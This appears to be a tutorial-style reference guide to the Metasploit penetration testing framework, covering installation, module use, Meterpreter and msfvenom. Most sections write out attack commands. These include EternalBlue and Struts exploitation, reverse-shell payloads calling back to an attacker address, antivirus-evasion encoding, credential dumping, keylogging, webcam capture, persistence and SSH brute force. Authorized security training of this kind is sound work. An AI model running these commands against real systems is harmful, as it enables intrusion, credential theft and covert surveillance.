# Metasploit Framework - Penetration Testing Platform

## 📖 Overview

**Metasploit Framework** is the world’s most popular penetration testing framework. It’s a powerful open-source platform for developing, testing, and executing exploit code against remote target machines.

### What Metasploit Does

- Automates the exploitation of known vulnerabilities
- Develops and tests exploits
- Performs network reconnaissance and enumeration
- Executes post-exploitation tasks
- Validates security vulnerabilities
- Assists in security assessments and penetration testing

### Key Features

- **Extensive Exploit Library**: Thousands of exploit modules
- **Payload Generation**: Create custom payloads for different platforms
- **Post-Exploitation**: Maintain access and gather information
- **Auxiliary Modules**: Scanners, fuzzers, and reconnaissance tools
- **Meterpreter**: Advanced payload for post-exploitation
- **Database Integration**: PostgreSQL for storing assessment data
- **Modular Architecture**: Easily extensible with custom modules

## 🔧 Installation

### Kali Linux (Pre-installed)

```bash
# Metasploit comes pre-installed on Kali Linux
msfconsole --version

# Update Metasploit
sudo apt update
sudo apt install metasploit-framework -y
```

### Linux (Debian/Ubuntu)

```bash
# Download and run installer
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Or use package manager
sudo apt update
sudo apt install metasploit-framework -y
```

### Linux (Manual Installation)

```bash
# Install dependencies
sudo apt install -y build-essential postgresql postgresql-contrib \
    libpq-dev ruby-dev libpcap-dev git

# Clone repository
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework

# Install gems
gem install bundler
bundle install

# Run Metasploit
./msfconsole
```

### macOS

```bash
# Using Homebrew
brew install metasploit

# Or download installer from:
# https://github.com/rapid7/metasploit-framework/wiki/Downloads
```

### Windows

1. Download installer from: https://github.com/rapid7/metasploit-framework/wiki/Downloads
1. Run the Windows installer (.exe)
1. Follow installation wizard
1. Launch from Start Menu or command line

### Docker Installation

```bash
# Pull and run Metasploit in Docker
docker pull metasploitframework/metasploit-framework
docker run --rm -it metasploitframework/metasploit-framework
```

### Database Setup (PostgreSQL)

```bash
# Start PostgreSQL service
sudo systemctl start postgresql

# Initialize Metasploit database
sudo msfdb init

# Check database connection
msfconsole
msf6 > db_status

# If needed, create database manually
sudo -u postgres createuser msf -P
sudo -u postgres createdb --owner=msf msf_database
```

## 💻 Basic Usage

### Starting Metasploit Console

```bash
msfconsole

# Start with specific resource script
msfconsole -r script.rc

# Start quietly (no banner)
msfconsole -q
```

### MSF Console Basics

#### Get Help

```bash
msf6 > help
msf6 > help search
msf6 > help use
```

#### Search for Modules

```bash
# Search by name
msf6 > search wordpress

# Search by type
msf6 > search type:exploit

# Search by platform
msf6 > search platform:windows

# Search by CVE
msf6 > search cve:2021-34473

# Combined search
msf6 > search type:exploit platform:linux apache
```

#### Using Modules

```bash
# Load a module
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show module information
msf6 exploit(windows/smb/ms17_010_eternalblue) > info

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RPORT 445

# Show available payloads
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.10
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444

# Run exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
# or
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

## 🎯 Module Types

### 1. Exploits

Modules that exploit vulnerabilities to gain access

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
msf6 > use exploit/multi/http/apache_struts_rce
```

### 2. Payloads

Code that runs after successful exploitation

```bash
# List payloads
msf6 > show payloads

# Types of payloads:
# Singles - Self-contained, don't need additional components
# Stagers - Sets up connection, downloads larger payload
# Stages - Downloaded by stager (Meterpreter, shell, etc.)

# Common payloads
windows/meterpreter/reverse_tcp
linux/x86/meterpreter/reverse_tcp
php/meterpreter/reverse_tcp
java/meterpreter/reverse_tcp
```

### 3. Auxiliary Modules

Scanners, fuzzers, and reconnaissance tools

```bash
# Port scanning
msf6 > use auxiliary/scanner/portscan/tcp

# SMB enumeration
msf6 > use auxiliary/scanner/smb/smb_version

# HTTP brute force
msf6 > use auxiliary/scanner/http/http_login

# SSH brute force
msf6 > use auxiliary/scanner/ssh/ssh_login
```

### 4. Post-Exploitation

Modules for maintaining access and gathering information

```bash
# Privilege escalation
msf6 > use post/windows/gather/enum_logged_on_users

# Credential dumping
msf6 > use post/windows/gather/hashdump

# Persistence
msf6 > use exploit/windows/local/persistence_service
```

### 5. Encoders

Encode payloads to evade detection

```bash
msf6 > show encoders
msf6 > set ENCODER x86/shikata_ga_nai
```

### 6. NOPs (No Operation)

Used for padding and IDS/IPS evasion

```bash
msf6 > show nops
```

## 🔍 Reconnaissance and Scanning

### Host Discovery

```bash
# Ping sweep
msf6 > use auxiliary/scanner/discovery/arp_sweep
msf6 auxiliary(scanner/discovery/arp_sweep) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/discovery/arp_sweep) > run

# UDP sweep
msf6 > use auxiliary/scanner/discovery/udp_sweep
```

### Port Scanning

```bash
# TCP port scan
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-1000
msf6 auxiliary(scanner/portscan/tcp) > run

# SYN scan (faster)
msf6 > use auxiliary/scanner/portscan/syn
```

### Service Enumeration

```bash
# SMB version detection
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_version) > run

# SSH version detection
msf6 > use auxiliary/scanner/ssh/ssh_version

# HTTP version detection
msf6 > use auxiliary/scanner/http/http_version

# FTP version detection
msf6 > use auxiliary/scanner/ftp/ftp_version
```

### Vulnerability Scanning

```bash
# SMB EternalBlue checker
msf6 > use auxiliary/scanner/smb/smb_ms17_010

# Apache Struts vulnerability scanner
msf6 > use auxiliary/scanner/http/apache_struts2_scanner

# Heartbleed checker
msf6 > use auxiliary/scanner/ssl/openssl_heartbleed
```

## 💀 Meterpreter

Meterpreter is an advanced payload that provides an interactive shell with extensive post-exploitation capabilities.

### Basic Meterpreter Commands

#### System Information

```bash
meterpreter > sysinfo          # System information
meterpreter > getuid           # Current user
meterpreter > ps               # Process list
meterpreter > pwd              # Current directory
meterpreter > getenv           # Environment variables
```

#### File System

```bash
meterpreter > ls               # List files
meterpreter > cd C:\\Windows   # Change directory
meterpreter > cat file.txt     # View file contents
meterpreter > download file.txt /root/  # Download file
meterpreter > upload shell.exe C:\\Windows\\Temp\\  # Upload file
meterpreter > search -f *.txt  # Search for files
```

#### Process Management

```bash
meterpreter > ps               # List processes
meterpreter > getpid           # Get current process ID
meterpreter > migrate 1234     # Migrate to process
meterpreter > kill 1234        # Kill process
```

#### Network

```bash
meterpreter > ipconfig         # Network interfaces
meterpreter > route            # Routing table
meterpreter > arp              # ARP cache
meterpreter > netstat          # Network connections
meterpreter > portfwd          # Port forwarding
```

#### Privilege Escalation

```bash
meterpreter > getsystem        # Attempt privilege escalation
meterpreter > getprivs         # Show privileges
```

#### Credential Harvesting

```bash
meterpreter > hashdump         # Dump password hashes
meterpreter > load kiwi        # Load Mimikatz
meterpreter > creds_all        # Dump all credentials
meterpreter > creds_msv        # Dump MSV credentials
meterpreter > lsa_dump_sam     # Dump SAM database
```

#### Keylogging

```bash
meterpreter > keyscan_start    # Start keylogger
meterpreter > keyscan_dump     # Dump captured keystrokes
meterpreter > keyscan_stop     # Stop keylogger
```

#### Screenshot and Webcam

```bash
meterpreter > screenshot       # Take screenshot
meterpreter > webcam_list      # List webcams
meterpreter > webcam_snap      # Take webcam snapshot
meterpreter > webcam_stream    # Stream webcam
```

#### Persistence

```bash
meterpreter > run persistence -X -i 60 -p 4444 -r 192.168.1.10
# -X: Automatic start on boot
# -i: Interval between connections (seconds)
# -p: Port for callback
# -r: IP for callback
```

#### Session Management

```bash
meterpreter > background       # Background session (Ctrl+Z)
msf6 > sessions -l             # List sessions
msf6 > sessions -i 1           # Interact with session 1
msf6 > sessions -k 1           # Kill session 1
```

## 🛠️ Payload Generation (MSFVenom)

MSFVenom is used to generate standalone payloads.

### Basic Syntax

```bash
msfvenom -p <payload> LHOST=<IP> LPORT=<port> -f <format> -o <output_file>
```

### Windows Payloads

#### Windows Reverse Shell (EXE)

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 LPORT=4444 \
    -f exe -o shell.exe
```

#### Windows Reverse Shell (DLL)

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 LPORT=4444 \
    -f dll -o shell.dll
```

#### Windows Reverse Shell (MSI)

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 LPORT=4444 \
    -f msi -o shell.msi
```

### Linux Payloads

#### Linux Reverse Shell (ELF)

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 LPORT=4444 \
    -f elf -o shell.elf
chmod +x shell.elf
```

### Web Payloads

#### PHP Reverse Shell

```bash
msfvenom -p php/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 LPORT=4444 \
    -f raw -o shell.php
```

#### JSP Reverse Shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp \
    LHOST=192.168.1.10 LPORT=4444 \
    -f raw -o shell.jsp
```

#### ASP Reverse Shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 LPORT=4444 \
    -f asp -o shell.asp
```

### Encoding Payloads

#### Encode with shikata_ga_nai

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 LPORT=4444 \
    -e x86/shikata_ga_nai -i 10 \
    -f exe -o encoded_shell.exe
```

### Android Payload

```bash
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 LPORT=4444 \
    -o shell.apk
```

### macOS Payload

```bash
msfvenom -p osx/x86/shell_reverse_tcp \
    LHOST=192.168.1.10 LPORT=4444 \
    -f macho -o shell.macho
```

### List Available Payloads

```bash
msfvenom --list payloads
msfvenom --list formats
msfvenom --list encoders
```

## 📊 Database Operations

### Database Commands

```bash
# Check database status
msf6 > db_status

# Import Nmap scan
msf6 > db_import nmap_scan.xml

# List hosts
msf6 > hosts

# List services
msf6 > services

# List vulnerabilities
msf6 > vulns

# Add host manually
msf6 > db_nmap 192.168.1.0/24
```

### Workspace Management

```bash
# List workspaces
msf6 > workspace

# Create new workspace
msf6 > workspace -a client_assessment

# Switch workspace
msf6 > workspace client_assessment

# Delete workspace
msf6 > workspace -d old_workspace
```

## 🎓 Practical Examples

### Example 1: SMB EternalBlue Exploitation

```bash
# 1. Search for exploit
msf6 > search ms17-010

# 2. Use exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 3. Check if target is vulnerable
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

# 4. Configure exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.10
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444

# 5. Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

# 6. Post-exploitation
meterpreter > getsystem
meterpreter > hashdump
meterpreter > screenshot
```

### Example 2: Web Application Exploitation

```bash
# 1. Scan web server
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(scanner/http/dir_scanner) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/http/dir_scanner) > run

# 2. Use web exploit (example: Apache Struts)
msf6 > use exploit/multi/http/struts2_content_type_ognl
msf6 exploit(multi/http/struts2_content_type_ognl) > set RHOSTS 192.168.1.100
msf6 exploit(multi/http/struts2_content_type_ognl) > set TARGETURI /struts2-showcase/
msf6 exploit(multi/http/struts2_content_type_ognl) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/http/struts2_content_type_ognl) > set LHOST 192.168.1.10
msf6 exploit(multi/http/struts2_content_type_ognl) > exploit
```

### Example 3: Password Attacks

```bash
# SSH brute force
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME root
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) > run
```

## 💡 Best Practices

### 1. Always Get Authorization

```bash
# Only test systems you own or have written permission to test
# Unauthorized testing is illegal
```

### 2. Use Workspaces

```bash
# Organize assessments by client/project
msf6 > workspace -a project_name
```

### 3. Take Notes

```bash
# Document findings
msf6 > notes -a "Found vulnerable SMB service"
```

### 4. Save Sessions

```bash
# Background sessions instead of killing them
meterpreter > background
```

### 5. Clean Up

```bash
# Remove backdoors and artifacts after testing
meterpreter > rm C:\\Windows\\Temp\\payload.exe
```

## 📚 Learning Resources

### Official Documentation

- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/) - Free online course
- [Rapid7 Metasploit Documentation](https://docs.rapid7.com/metasploit/)
- [Metasploit Framework Wiki](https://github.com/rapid7/metasploit-framework/wiki)

### Books

- “Metasploit: The Penetration Tester’s Guide” by David Kennedy
- “Mastering Metasploit” by Nipun Jaswal
- “Metasploit Bootcamp” by Nipun Jaswal

### Online Resources

- [Offensive Security Training](https://www.offensive-security.com/)
- [Metasploit Minute](https://www.youtube.com/playlist?list=PLW5y1tjAOzI0ZperDaxZG_FaJjpPzZwPn)
- [HackerSploit](https://www.youtube.com/c/HackerSploit)

### Practice Environments

- [Metasploitable 2/3](https://github.com/rapid7/metasploitable3) - Vulnerable VMs
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe Metasploit Rooms](https://tryhackme.com/)
- [VulnHub](https://www.vulnhub.com/)

## ⚠️ Common Issues and Solutions

### Issue: Database connection failed

**Solution**:

```bash
# Reinitialize database
sudo msfdb reinit

# Or manually configure
sudo msfdb init
```

### Issue: Exploit completed but no session created

**Solutions**:

- Check firewall rules on attacker machine
- Verify LHOST is correct (not 127.0.0.1)
- Try different payload
- Check target actually vulnerable
- Review exploit options

### Issue: Meterpreter session dies immediately

**Solutions**:

- Migrate to stable process: `migrate <PID>`
- Use different payload
- Check antivirus on target
- Try encoded payload

## 🔒 Security and Ethics

### Legal Considerations

- **Authorization Required**: Always obtain written permission
- **Legal Consequences**: Unauthorized access is illegal (CFAA, GDPR, etc.)
- **Scope of Work**: Stay within agreed testing boundaries
- **Report Findings**: Properly document and report vulnerabilities

### Responsible Use

- ✅ Use for authorized penetration testing
- ✅ Educational purposes in isolated labs
- ✅ Security research with proper disclosure
- ✅ Red team exercises with authorization
- ❌ Never use without explicit permission
- ❌ Don’t access data beyond scope
- ❌ Avoid damaging systems or data
- ❌ Never sell exploits to malicious actors

### Reporting

- Document all findings professionally
- Provide remediation recommendations
- Follow responsible disclosure practices
- Maintain confidentiality

## 📝 Quick Reference Commands

```bash
# Console basics
msfconsole                     # Start Metasploit
help                          # Show help
search <term>                 # Search modules
use <module>                  # Use module
info                          # Show module info
show options                  # Show options
set <option> <value>          # Set option
exploit/run                   # Execute module
back                          # Exit module

# Database
db_status                     # Check DB status
db_nmap <args>                # Run Nmap, import results
hosts                         # List hosts
services                      # List services

# Sessions
sessions -l                   # List sessions
sessions -i <id>              # Interact with session
sessions -k <id>              # Kill session
background                    # Background session

# Meterpreter
sysinfo                       # System info
getuid                        # Current user
getsystem                     # Escalate privileges
hashdump                      # Dump hashes
screenshot                    # Take screenshot
shell                         # Get system shell
```

-----

**Last Updated**: October 2025  
**Framework Version**: Metasploit Framework 6.x  
**License**: Metasploit Framework is licensed under BSD
